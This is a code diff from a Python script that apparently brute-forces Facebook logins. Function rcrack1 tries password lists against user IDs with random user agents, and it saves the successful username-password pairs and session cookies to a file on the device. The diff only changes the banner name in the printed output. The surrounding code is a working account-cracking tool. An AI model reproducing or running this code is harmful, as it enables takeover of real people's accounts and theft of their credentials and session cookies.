@@ -195,7 +195,7 @@ def rcrack1(uid,pwx,tl):
         for ps in pwx:
             pro = random.choice(ugen)
             session = requests.Session()
-            sys.stdout.write('\r[\033[1;92mAlvi Hassan\033[1;97m] > [%s/%s] > [OK\033[1;97m:-\033[1;92m%s\033[1;97m] - [CP\033[1;97m:-\033[1;91m%s\033[1;97m] \r'%(loop,tl,len(oks),len(cps))),
+            sys.stdout.write('\r[\033[1;92m𝐀𝐦𝐢𝐫𝐮𝐥-𝐀𝐧𝐝𝐉𝐞𝐫𝐫𝐲\033[1;97m] > [%s/%s] > [OK\033[1;97m:-\033[1;92m%s\033[1;97m] - [CP\033[1;97m:-\033[1;91m%s\033[1;97m] \r'%(loop,tl,len(oks),len(cps))),
             sys.stdout.flush()
             free_fb = session.get('https://x.facebook.com').text
             log_data = {
@@ -231,7 +231,7 @@ def rcrack1(uid,pwx,tl):
             if 'c_user' in log_cookies:
                 coki=";".join([key+"="+value for key,value in session.cookies.get_dict().items()])
                 cid = coki[7:22]
-                print(f"\033[38;5;46m[Alvi Hassan💥-OK] {uid} | {ps}")
+                print(f"\033[38;5;46m[𝐀𝐦𝐢𝐫𝐮𝐥-*𝐀𝐧𝐝𝐉𝐞𝐫𝐫𝐲💥-OK] {uid} | {ps}")
                 print(f" Cookie : {coki}")
                 open('/sdcard/Jerry-King.txt', 'a').write( uid+' | '+ps+'\n')
                 oks.append(uid)
@@ -239,7 +239,7 @@ def rcrack1(uid,pwx,tl):
             elif 'checkpoint' in log_cookies:
                 coki=";".join([key+"="+value for key,value in session.cookies.get_dict().items()])
                 cid = coki[82:97]
-                print(f"\x1b[38;5;196m[Alvi Hassan-CP] {cid} | {ps}")
+                print(f"\x1b[38;5;196m[𝐀𝐦𝐢𝐫𝐮𝐥-*𝐀𝐧𝐝𝐉𝐞𝐫𝐫𝐲-CP] {cid} | {ps}")
                 open('/sdcard/Jerry-king.txt', 'a').write( uid+' | '+ps+' \n')
                 cps.append(uid)
                 break
